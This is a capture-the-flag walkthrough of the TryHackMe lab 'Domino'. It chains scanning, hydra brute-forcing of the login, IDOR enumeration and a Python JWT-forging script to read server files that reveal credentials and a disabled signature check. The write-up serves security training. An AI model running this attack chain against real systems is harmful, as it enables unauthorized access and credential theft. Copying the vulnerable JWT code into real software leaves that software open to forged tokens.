# Domino

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Medium
Tags: Linux
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Chain together vulnerabilities in a cascading attack, where every piece you find knocks over the next.
```

Room link: [https://tryhackme.com/room/domino](https://tryhackme.com/room/domino)

## Solution

### Task 1: Challenge

#### Set up your virtual environment

To successfully complete this room, you'll need to set up your virtual environment. This involves starting both your AttackBox (if you're not using your VPN) and Lab Machines, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.

The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

 As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

*A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time*.

---------------------------------------------------------------------------------------

#### Check for services with nmap

We start by scanning the machine on all TCP-ports with nmap including service info and default scripts.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ export TARGET_IP=10.81.166.197

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-30 09:32 +0200
Nmap scan report for 10.81.166.197
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d8:8f:c5:4b:f7:64:59:25:df:00:c5:60:3e:e8:b0:d2 (ECDSA)
|_  256 c4:84:62:07:d6:08:50:a9:9a:48:1e:2a:0a:17:57:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NexusCorp Portal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.19 seconds
```

We can see that two TCP-services are running on the machine:

- An [OpenSSH](https://en.wikipedia.org/wiki/OpenSSH) server version 9.6p1 running on port 22
- An [Apache httpd](https://en.wikipedia.org/wiki/Apache_HTTP_Server) web server version 2.4.58 running on port 80

#### Analyse the web site

We manually browse to `http://10.81.166.197/` and find the NexusCorp employee login portal:

![Domino Login Page](Images/Domino_Login_Page.png)

Next, we do some basic HTTP-enumeration with `nmap`.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ nmap -v -p 80 --script "http-* and discovery" $TARGET_IP 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-30 09:36 +0200
NSE: Loaded 62 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:36
Completed NSE at 09:36, 0.00s elapsed
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
Initiating Ping Scan at 09:36
Scanning 10.81.166.197 [4 ports]
Completed Ping Scan at 09:36, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:36
Completed Parallel DNS resolution of 1 host. at 09:36, 0.50s elapsed
Initiating SYN Stealth Scan at 09:36
Scanning 10.81.166.197 [1 port]
Discovered open port 80/tcp on 10.81.166.197
Completed SYN Stealth Scan at 09:36, 0.06s elapsed (1 total ports)
NSE: Script scanning 10.81.166.197.
Initiating NSE at 09:36
Completed NSE at 09:40, 231.03s elapsed
Nmap scan report for 10.81.166.197
Host is up (0.041s latency).

Bug in http-security-headers: no string output.
PORT   STATE SERVICE
80/tcp open  http
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 3
|     /static/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /static/
|   Total files found (by extension):
|_    Other: 1; css: 1; php: 3
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-mobileversion-checker: No mobile version detected.
|_http-feed: Couldn't find any feeds.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-title: NexusCorp Portal
| http-headers: 
|   Date: Sun, 30 Aug 2026 07:37:00 GMT
|   Server: Apache/2.4.58 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
|_http-chrono: Request times for /; avg: 100.54ms; min: 92.31ms; max: 129.89ms
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-auth-finder: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.81.166.197
|   url                                method
|   http://10.81.166.197:80/           FORM
|_  http://10.81.166.197:80/index.php  FORM
|_http-date: Sun, 30 Aug 2026 07:36:59 GMT; -2s from local time.
| http-vhosts: 
|_128 names had status 200
| http-grep: 
|   (7) http://10.81.166.197:80/team.php: 
|     (7) email: 
|       + laura.hayes@nexus.corp
|       + michael.chen@nexus.corp
|       + sarah.johnson@nexus.corp
|       + robert.wilson@nexus.corp
|       + emma.taylor@nexus.corp
|       + david.brown@nexus.corp
|_      + james.wright@nexus.corp
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-comments-displayer: Couldn't find any comments.
| http-php-version: Logo query returned unknown hash b800801c2268e175289bfb0de139afc9
|_Credits query returned unknown hash b800801c2268e175289bfb0de139afc9
|_http-errors: Couldn't find any error pages.
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-xssed: No previously reported XSS vuln.
| http-enum: 
|   /backup/: Backup folder w/ directory listing
|_  /api/: Potentially interesting folder

NSE: Script Post-scanning.
Initiating NSE at 09:40
Completed NSE at 09:40, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 232.02 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```

The most interesting finding here is the e-mail addresses of seven employees:

- `laura.hayes@nexus.corp`
- `michael.chen@nexus.corp`
- `sarah.johnson@nexus.corp`
- `robert.wilson@nexus.corp`
- `emma.taylor@nexus.corp`
- `david.brown@nexus.corp`
- `james.wright@nexus.corp`

Let's also search for additional files and directories with `gobuster`.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.81.166.197
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/support              (Status: 200) [Size: 861]
/admin                (Status: 403) [Size: 322]
/static               (Status: 200) [Size: 1128]
/index.php            (Status: 200) [Size: 861]
/team.php             (Status: 200) [Size: 3747]
/api                  (Status: 200) [Size: 2]
/javascript           (Status: 403) [Size: 278]
/logout.php           (Status: 200) [Size: 861]
/config.php           (Status: 200) [Size: 0]
/backup               (Status: 200) [Size: 1141]
/forgot.php           (Status: 200) [Size: 684]
/403.php              (Status: 200) [Size: 322]
/auth.php             (Status: 200) [Size: 0]
/dashboard.php        (Status: 200) [Size: 861]
/reset.php            (Status: 200) [Size: 410]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

#### Analyse the backup files

Accessing `http://10.81.166.197/backup/` we find that directory listing is enabled:

![Domino Backup Page](Images/Domino_Backup_Page.png)

Both files are downloaded for analysis:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ wget http://10.81.166.197/backup/README.txt 
--2026-08-30 09:52:11--  http://10.81.166.197/backup/README.txt
Connecting to 10.81.166.197:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 191 [text/plain]
Saving to: ‘README.txt’

README.txt                                100%[==================================================================================>]     191  --.-KB/s    in 0s 

2026-08-30 09:52:11 (12.7 MB/s) - ‘README.txt’ saved [191/191]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ wget http://10.81.166.197/backup/config.enc
--2026-08-30 09:52:25--  http://10.81.166.197/backup/config.enc
Connecting to 10.81.166.197:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112
Saving to: ‘config.enc’

config.enc                                100%[==================================================================================>]     112  --.-KB/s    in 0s 

2026-08-30 09:52:25 (12.0 MB/s) - ‘config.enc’ saved [112/112]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ cat README.txt 
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

We also check the mentioned JavaScript file.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl http://10.81.166.197/static/app.js --output -
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with )
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
    };

    // Session helper
    window.NexusApp = {
        getSession: function() {
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
            if (!cookie) return null;
            try {
                return JSON.parse(atob(cookie.split('=')[1].trim()));
            } catch(e) { return null; }
        },
        getApiToken: function() {
            return localStorage.getItem('nexus_jwt');
        },
        setApiToken: function(token) {
            localStorage.setItem('nexus_jwt', token);
        }
    };

    // Auto-fetch JWT if not cached
    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
        fetch('/api/auth/token.php', {credentials: 'include'})
            .then(r => r.json())
            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
            .catch(() => {});
    }
})();
```

Nice, a key (`N3xusK3y2024!!`) for the encypted configuration.

#### Decrypt the configuration

The key cannot be used as is since it is NULL-padded, but with help of Python and `openssl` we can decrypt the configuration.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ file config.enc 
config.enc: data

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ cat config.enc 
1�u�4]@K`���ۦ���qˌ"���~Ps�s��i�ɮ��(܋����PK�Gy^�h�ҲA-\��vt���b��/װ�1Wm�Z�%A��v���6+d�O�}a
                                                                                        �����i� 
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ openssl enc -aes-128-ecb -d -in config.enc -out config_decrypted -k 'N3xusK3y2024!!'
bad magic number
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ python -c 'print("N3xusK3y2024!!".encode().ljust(16, b"\x00").hex())'
4e337875734b33793230323421210000

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ openssl enc -aes-128-ecb -d -in config.enc -out config_decrypted -nopad -K 4e337875734b33793230323421210000

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ cat config_decrypted 
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}  
```

The configuration wasn't that exciting though, but we can assume that there is a `devops` user on the machine.

#### Brute-force the login portal

Next, we go back to the login portal and our found user list.

We create a list of our found user names.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ vi users.txt 
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ cat users.txt  
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

Capture a failed test login with [Burp](https://portswigger.net/burp).

```text
POST /index.php HTTP/1.1
Host: 10.81.166.197
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.81.166.197
Connection: keep-alive
Referer: http://10.81.166.197/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=test&password=test
```

And start brute-forcing with `hydra` based on the captured request and response.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 32 $TARGET_IP http-post-form "/:username=^USER^&password=^PASS^:F=invalid"  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-30 10:23:23
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 32 tasks per 1 server, overall 32 tasks, 1834 login tries (l:7/p:262), ~58 tries per task
[DATA] attacking http-post-form://10.81.166.197:80/:username=^USER^&password=^PASS^:F=invalid
[80][http-post-form] host: 10.81.166.197   login: laura.hayes
[80][http-post-form] host: 10.81.166.197   login: michael.chen
[80][http-post-form] host: 10.81.166.197   login: sarah.johnson
[80][http-post-form] host: 10.81.166.197   login: sarah.johnson   password: password
[80][http-post-form] host: 10.81.166.197   login: robert.wilson
[80][http-post-form] host: 10.81.166.197   login: robert.wilson   password: password
[80][http-post-form] host: 10.81.166.197   login: emma.taylor
[80][http-post-form] host: 10.81.166.197   login: emma.taylor   password: password
[80][http-post-form] host: 10.81.166.197   login: david.brown
[80][http-post-form] host: 10.81.166.197   login: james.wright
1 of 1 target successfully completed, 10 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-30 10:24:07
```

Three of the users seems to have the password `password`.

Let's verify this by logging in as `sarah.johnson`.

#### Login as Sarah Johnson

We are indeed successful to login at `http://10.81.166.197/index.php` as Sarah:

![Domino Dashboard Page](Images/Domino_Dashboard_Page.png)

The notes reagarding the APIs looks interesting. Let's analyse them next.

#### Analyse the APIs

We re-login with `curl` to get a session cookie stored in the local file `cookie.jar`.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -d 'username=sarah.johnson&password=password' -c cookie.jar http://$TARGET_IP/index.php

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ cat cookie.jar
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

10.81.166.197   FALSE   /       FALSE   0       nexus_session   eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d
```

Next, we request a token via the auth API.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -b cookie.jar http://$TARGET_IP/api/auth/token.php 
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODgwNzk0NjksImV4cCI6MTc4ODA4MzA2OX0.E31bWclMGjdLRWCbztdB+3cPOWYWqOBhZ7TQjez6bcc","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}   

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -b cookie.jar http://$TARGET_IP/api/auth/token.php | jq
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODgwNzk0OTIsImV4cCI6MTc4ODA4MzA5Mn0.ejKt9rajfh6UoyHIYVJPFx/n/oHZKYYx203oVuo5Wp4", 
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

Now we can start to request files. The token isn't stored in the cookie jar so we need to explicitly pass it:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -b cookie.jar http://$TARGET_IP/api/files.php 
{"error":"JWT token required. Get one from \/api\/auth\/token.php"}   

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -b cookie.jar -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODgwNzk4MDksImV4cCI6MTc4ODA4MzQwOX0.JrQN55pQ4GZ2/gJxrPGVJpoLd9DQU2r+geE4Szjy88I" http://$TARGET_IP/api/files.php 
{"error":"Admin JWT required. Check your token payload."}   
```

However, it looks like we need Admin access for that.

Going back to the dashboard, there is a third API that can be found via the `My profile API`-link.

The link points to `http://10.81.166.197/api/users/profile.php?id=3` and returns basic JSON-info.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -b cookie.jar -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODgwNzk4MDksImV4cCI6MTc4ODA4MzQwOX0.JrQN55pQ4GZ2/gJxrPGVJpoLd9DQU2r+geE4Szjy88I" http://$TARGET_IP/api/users/profile.php?id=3 | jq
{
  "id": 3,
  "username": "sarah.johnson",
  "email": "sarah.johnson@nexus.corp",
  "role": "user",
  "notes": ""
}
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -b cookie.jar http://$TARGET_IP/api/users/profile.php?id=3 | jq
{
  "id": 3,
  "username": "sarah.johnson",
  "email": "sarah.johnson@nexus.corp",
  "role": "user",
  "notes": ""
}
```

Note that no authentication token is required to access the profile API.

#### IDOR Enumeration

Given the `id=<num>` syntax, we of course want to check for [IDOR (Insecure direct object reference)](https://en.wikipedia.org/wiki/Insecure_direct_object_reference).

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ for num in $(seq 1 10); do curl -s -b cookie.jar http://$TARGET_IP/api/users/profile.php?id=$num | jq; done
{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "THM{<REDACTED>}"
}
{
  "id": 2,
  "username": "michael.chen",
  "email": "michael.chen@nexus.corp",
  "role": "user",
  "notes": ""
}
{
  "id": 3,
  "username": "sarah.johnson",
  "email": "sarah.johnson@nexus.corp",
  "role": "user",
  "notes": ""
}
{
  "id": 4,
  "username": "robert.wilson",
  "email": "robert.wilson@nexus.corp",
  "role": "user",
  "notes": ""
}
{
  "id": 5,
  "username": "emma.taylor",
  "email": "emma.taylor@nexus.corp",
  "role": "user",
  "notes": "Q3 migration notes: infra review pending approval"
}
{
  "id": 6,
  "username": "david.brown",
  "email": "david.brown@nexus.corp",
  "role": "user",
  "notes": ""
}
{
  "id": 7,
  "username": "james.wright",
  "email": "james.wright@nexus.corp",
  "role": "user",
  "notes": ""
}
{
  "error": "User not found"
}
{
  "error": "User not found"
}
{
  "error": "User not found"
}
```

And there, in the notes of the Admin user Laura we find the first flag.

---------------------------------------------------------------------------------------

#### What is the flag found in the admin user's profile notes?

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------------------

#### Craft an admin JWT

To get access to the files API we need an admin [JWT]((https://en.wikipedia.org/wiki/JSON_Web_Token)).

We start with decoding our current JWT with [jwt.rocks](https://jwt.rocks/)

![Domino JWT 1](Images/Domino_JWT_1.png)

To forge a new JWT we need the key but we found it (`N3xusK3y2024!!`) in the JavaScript file earlier.

This little Python-script will create a new JWT for us:

```python
#!/usr/bin/env python

import hmac, hashlib, base64, json, time

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
secret = b'N3xusK3y2024!!'

payload = b64url(json.dumps({
    "sub": "cajac",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}, separators=(',', ':')))

msg = f"{header}.{payload}"
sig = hmac.new(secret, msg.encode(), hashlib.sha256).digest()
print(f"{msg}.{b64url(sig)}")
```

Then we execute the script to get a new Admin JWT.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ ./create_jwt.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk
```

#### Access files via the API

Now we can start to access files via the API.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/api/files.php?name=/etc/hosts
{"error":"Access denied: path must be within \/var\/www\/html\/"}  
```

Nope, we can only access files under `/var/www/html`.

How about accessing `config.php` where credentials are often stored?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/api/files.php?name=/var/www/html/config.php
{"file":"\/var\/www\/html\/config.php","content":"<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?>\n"} 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/api/files.php?name=/var/www/html/config.php | jq
{
  "file": "/var/www/html/config.php",
  "content": "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?>\n" 
}
```

We have a database password: `D3v0ps!2024`.

And we also have a completly different JWT secret (`nexus_jwt_s3cr3t_2024`).

It looks like the signature isn't checked correctly, or at all. Let's verify this by checking `auth.php`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/api/files.php?name=/var/www/html/auth.php | jq
{
  "file": "/var/www/html/auth.php",
  "content": "<?php\nrequire_once __DIR__ . '/config.php';\n\nfunction get_session() {\n    if (!isset($_COOKIE['nexus_session'])) return null;\n    $raw = $_COOKIE['nexus_session'];\n    // Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)\n    $parts = explode('.', $raw, 2);\n    if (count($parts) !== 2) return null;\n    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);\n    if (!hash_equals($expected_sig, $parts[1])) return null;\n    $decoded = base64_decode($parts[0]);\n    $data = json_decode($decoded, true);\n    if (!$data || !isset($data['user_id'])) return null;\n    // Role always fetched from DB - cookie role value ignored\n    $db = get_db();\n    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');\n    $stmt->execute([$data['user_id']]);\n    return $stmt->fetch(PDO::FETCH_ASSOC);\n}\n\nfunction require_login() {\n    $user = get_session();\n    if (!$user) { header('Location: /index.php'); exit; }\n    return $user;\n}\n\nfunction require_admin() {\n    $user = require_login();\n    if ($user['role'] !== 'admin') {\n        http_response_code(403);\n        header('Content-Type: application/json');\n        echo json_encode(['error' => 'Forbidden']);\n        exit;\n    }\n    return $user;\n}\n\nfunction generate_jwt($username) {\n    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');\n    // Bug: role always set to \"user\" regardless of actual user role\n    $payload = rtrim(base64_encode(json_encode([\n        'sub' => $username,\n        'role' => 'user',\n        'iat' => time(),\n        'exp' => time() + 3600\n    ])), '=');\n    $sig = rtrim(base64_encode(hash_hmac('sha256', \"$header.$payload\", JWT_SECRET, true)), '=');\n    return \"$header.$payload.$sig\";\n}\n\nfunction verify_jwt($token) {\n    $parts = explode('.', $token);\n    if (count($parts) !== 3) return null;\n    $payload = json_decode(base64_decode($parts[1]), true);\n    if (!$payload) return null;\n    // Signature check intentionally disabled\n    // $expected = rtrim(base64_encode(hash_hmac('sha256', \"$parts[0].$parts[1]\", JWT_SECRET, true)),'=');\n    // if (!hash_equals($parts[2], $expected)) return null;\n    if (isset($payload['exp']) && $payload['exp'] < time()) return null;\n    return $payload;\n}\n?>\n" 
}
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/api/files.php?name=/var/www/html/auth.php | jq -r '.content'
<?php
require_once __DIR__ . '/config.php';

function get_session() {
    if (!isset($_COOKIE['nexus_session'])) return null;
    $raw = $_COOKIE['nexus_session'];
    // Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
    $parts = explode('.', $raw, 2);
    if (count($parts) !== 2) return null;
    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;
    $decoded = base64_decode($parts[0]);
    $data = json_decode($decoded, true);
    if (!$data || !isset($data['user_id'])) return null;
    // Role always fetched from DB - cookie role value ignored
    $db = get_db();
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function require_login() {
    $user = get_session();
    if (!$user) { header('Location: /index.php'); exit; }
    return $user;
}

